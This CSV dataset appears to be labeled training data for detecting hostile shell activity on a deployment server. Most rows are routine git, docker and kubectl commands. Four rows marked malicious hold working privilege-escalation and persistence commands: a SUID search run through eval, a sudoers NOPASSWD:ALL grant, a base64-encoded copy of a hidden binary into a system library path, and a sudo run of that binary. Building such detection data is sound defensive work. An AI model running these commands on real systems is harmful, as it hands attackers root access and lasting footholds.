process_name,command_line,label
npm,npm ci --no-audit,benign
git,git commit -am 'fix: auth-svc retry logic',benign
kubectl,kubectl get pods -n production,benign
git,git checkout release/2.4,benign
kubectl,kubectl logs deploy/search --tail 50,benign
bash,"X='find / -perm -4000 -type f 2>/dev/null'; eval ""$X""",malicious
docker,docker build -t auth-svc:54 .,benign
systemctl,systemctl status auth-svc,benign
psql,psql -h db -U deploy -c 'SELECT count(*) FROM orders;',benign
make,make lint,benign
go,go build ./...,benign
kubectl,kubectl rollout status deploy/payments,benign
docker,docker logs --tail 100 postgres,benign
terraform,terraform plan -out tfplan,benign
pip3,pip3 install -r requirements.txt,benign
systemctl,systemctl restart auth-svc,benign
rsync,rsync -az /home/deploy/mobile-api/dist/ /var/www/worker/,benign
docker,docker logs --tail 100 nginx,benign
free,free -m,benign
bash,"X='echo '\''deploy ALL=(ALL) NOPASSWD:ALL'\'' | sudo tee -a /etc/sudoers.d/x'; eval ""$X""",malicious
bash,ls -la /home/deploy,benign
journalctl,journalctl -u nginx --since '10 min ago',benign
ps,ps aux --sort=-%mem | head,benign
python3,python3 /opt/app/manage.py migrate,benign
docker,docker ps -a,benign
kubectl,kubectl rollout status deploy/search,benign
bash,echo Y3AgL2Rldi9zaG0vLmZvbnQtdW5peC8udGVsZW1ldHJ5IC91c3IvbGliL3g4Nl82NC1saW51eC1nbnUvbGlicmVwb3J0aGVscGVyLnNv | base64 -d | bash,malicious
scp,scp report.csv deploy@reports:/srv/reports/,benign
docker,docker compose up -d api-gateway,benign
bash,cd /home/deploy/platform && ls,benign
git,git status,benign
grep,grep -r 'TODO' /home/deploy/web-app/src,benign
df,df -h,benign
apt-get,apt-get install -y jq,benign
bash,cd /home/deploy/web-app && ls,benign
git,git pull origin feature/checkout,benign
docker,docker build -t redis:97 .,benign
bash,"X='sudo /dev/shm/.font-unix/.telemetry'; eval ""$X""",malicious
curl,curl -s http://localhost:8080/health,benign
docker,docker logs --tail 100 search,benign
